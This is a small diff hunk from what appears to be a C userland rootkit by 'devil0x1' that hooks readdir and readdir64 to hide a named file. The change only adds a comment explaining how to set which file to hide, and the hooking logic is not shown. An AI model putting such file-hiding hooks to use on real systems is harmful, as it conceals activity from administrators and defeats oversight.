@@ -4,7 +4,7 @@
 #include <dirent.h>
 #include <string.h>
 // by devil0x1
-#define FILENAME "test.txt"
+#define FILENAME "test.txt" // change this string value to any of the file you wanted to hide 
 
 static struct dirent *(*original_readdir)(DIR *) = NULL;
 static struct dirent64 *(*original_readdir64)(DIR *) = NULL;
